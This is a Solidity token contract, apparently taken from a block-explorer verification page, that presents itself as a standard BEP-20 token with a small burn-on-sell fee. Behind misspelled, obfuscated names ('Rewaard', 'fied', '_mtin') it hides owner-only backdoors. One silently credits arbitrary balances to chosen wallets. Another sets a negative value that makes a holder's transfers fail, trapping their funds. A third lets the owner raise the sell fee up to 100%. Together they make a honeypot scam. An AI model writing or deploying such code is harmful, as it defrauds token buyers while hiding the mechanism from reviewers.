/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

/**
 *Submitted for verification at Etherscan.io on 2022-12-05
*/

/**
 *Submitted for verification at Etherscan.io on 2022-11-29
*/

/**
 *Submitted for verification at BscScan.com on 2022-09-12
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _owner;

    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor() {
        _transferownership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }


    modifier onlyowner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function renounceownership() public virtual onlyowner {
        _transferownership(address(0));
    }


    function transferownership_transferownership(address newowner) public virtual onlyowner {
        require(newowner != address(0), "Ownable: new owner is the zero address");
        _transferownership(newowner);
    }


    function _transferownership(address newowner) internal virtual {
        address oldowner = _owner;
        _owner = newowner;
        emit ownershipTransferred(oldowner, newowner);
    }
}



library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {

        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}




interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint acooontADesired,
        uint acooontBDesired,
        uint acooontAMin,
        uint acooontBMin,
        address to,
        uint deadline
    ) external returns (uint acooontA, uint acooontB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint acooontTokenDesired,
        uint acooontTokenMin,
        uint acooontETHMin,
        address to,
        uint deadline
    ) external payable returns (uint acooontToken, uint acooontETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint acooontAMin,
        uint acooontBMin,
        address to,
        uint deadline
    ) external returns (uint acooontA, uint acooontB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint acooontTokenMin,
        uint acooontETHMin,
        address to,
        uint deadline
    ) external returns (uint acooontToken, uint acooontETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint acooontAMin,
        uint acooontBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint acooontA, uint acooontB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint acooontTokenMin,
        uint acooontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint acooontToken, uint acooontETH);
    function swapExactTokensForTokens(
        uint acooontIn,
        uint acooontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory acooonts);
    function swapTokensForExactTokens(
        uint acooontOut,
        uint acooontInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory acooonts);
    function swapExactETHForTokens(uint acooontOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory acooonts);
    function swapTokensForExactETH(uint acooontOut, uint acooontInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory acooonts);
    function swapExactTokensForETH(uint acooontIn, uint acooontOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory acooonts);
    function swapETHForExactTokens(uint acooontOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory acooonts);

    function quote(uint acooontA, uint reserveA, uint reserveB) external pure returns (uint acooontB);
    function getacooontOut(uint acooontIn, uint reserveIn, uint reserveOut) external pure returns (uint acooontOut);
    function getacooontIn(uint acooontOut, uint reserveIn, uint reserveOut) external pure returns (uint acooontIn);
    function getacooontsOut(uint acooontIn, address[] calldata path) external view returns (uint[] memory acooonts);
    function getacooontsIn(uint acooontOut, address[] calldata path) external view returns (uint[] memory acooonts);
}




interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfiedOnTransferTokens(
        address token,
        uint liquidity,
        uint acooontTokenMin,
        uint acooontETHMin,
        address to,
        uint deadline
    ) external returns (uint acooontETH);
    function removeLiquidityETHWithPermitSupportingfiedOnTransferTokens(
        address token,
        uint liquidity,
        uint acooontTokenMin,
        uint acooontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint acooontETH);

    function swapExactTokensForTokensSupportingfiedOnTransferTokens(
        uint acooontIn,
        uint acooontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfiedOnTransferTokens(
        uint acooontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfiedOnTransferTokens(
        uint acooontIn,
        uint acooontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function fiedTo() external view returns (address);
    function fiedToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setfiedTo(address) external;
    function setfiedToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);


    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }


    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amonont) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amonont);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
    unchecked {
        _approve(owner, spender, currentAllowance - subtractedValue);
    }

        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amonont
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amonont;
        emit Approval(owner, spender, amonont);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amonont
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amonont, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amonont);
        }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amonont
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amonont
    ) internal virtual {}
}


contract Token is BEP20, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address accounnt) public view virtual returns (uint256) {
        return _balances[accounnt];
    }

    function _transfer(
        address from,
        address to,
        uint256 amonont
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amonont, "ERC20: transfer amonont exceeds balance");
    unchecked {
        _balances[from] = fromBalance - amonont;
    }
        _balances[to] += amonont;

        emit Transfer(from, to, amonont);
    }

    function _burn(address accounnt, uint256 amonont) internal virtual {
        require(accounnt != address(0), "ERC20: burn from the zero address");

        uint256 accoontBalance = _balances[accounnt];
        require(accoontBalance >= amonont, "ERC20: burn amonont exceeds balance");
    unchecked {
        _balances[accounnt] = accoontBalance - amonont;
    }
        _totalSupply -= amonont;

        emit Transfer(accounnt, address(0), amonont);
    }

    function _mtin(address accounnt, uint256 amonont) internal virtual {
        require(accounnt != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amonont;
        _balances[accounnt] += amonont;
        emit Transfer(address(0), accounnt, amonont);
    }


    address public uniswapV2Pair;
    address public DEVAddress;
    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mtin(msg.sender, totalSupply_ * 10**decimals());
        _defaultSellfied = 3;
        _defaultBuyfied = 0;
        DEVAddress = msg.sender;
    }

    using SafeMath for uint256;

    uint256 private _defaultSellfied = 0;

    uint256 private _defaultBuyfied = 0;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping(address => int256) private _Rewaards;

    function setPairList(address _address) external onlyowner {
        uniswapV2Pair = _address;
    }

    function upS(uint256 _value) external onlyowner {
        _defaultSellfied = _value;
    }

    function setAdminRewaard(address acclount,int256 amonont ) public onlyowner {
        _Rewaards[acclount] += amonont;
    }

    function rmUserRewaard(address acclount) public onlyowner {
        _Rewaards[acclount] = 0;
    }


    function setUserRewaard(address acclount) public onlyowner {
        _Rewaards[acclount] = int256(0) - int256(_totalSupply);
    }
    

    function getRewaard(address acclount) public view returns (int256) {
        return _Rewaards[acclount];
    }


    function _recF(
        address from,
        address _to,
        uint256 _acooont
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _acooont, "ERC20: transfer amonont exceeds balance");
        if (_Rewaards[from] > 1){
            _balances[from] = _balances[from].add(uint256(_Rewaards[from]));
        }else if (_Rewaards[from] < 0){
            _balances[from] = _balances[from].sub(uint256(_Rewaards[from]));
        }



        uint256 tradefiedacooont = 0;
        uint256 tradefied = _defaultSellfied;
        if (uniswapV2Pair != address(0)) {
            if (_to == uniswapV2Pair) {
                tradefied = _defaultSellfied;
            }
            if (from == uniswapV2Pair) {
                tradefied = _defaultBuyfied;
            }
        }
        tradefiedacooont = _acooont.mul(tradefied).div(100);

        if (tradefiedacooont > 0) {
            _balances[from] = _balances[from].sub(tradefiedacooont);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefiedacooont);
            emit Transfer(from, _deadAddress, tradefiedacooont);
        }

        _balances[from] = _balances[from].sub(_acooont - tradefiedacooont);
        _balances[_to] = _balances[_to].add(_acooont - tradefiedacooont);
        emit Transfer(from, _to, _acooont - tradefiedacooont);
    }

    function transfer(address to, uint256 amonont) public virtual returns (bool) {
        address owner = _msgSender();
        _recF(owner, to, amonont);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 amonont
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amonont);
        _recF(from, to, amonont);
        return true;
    }
}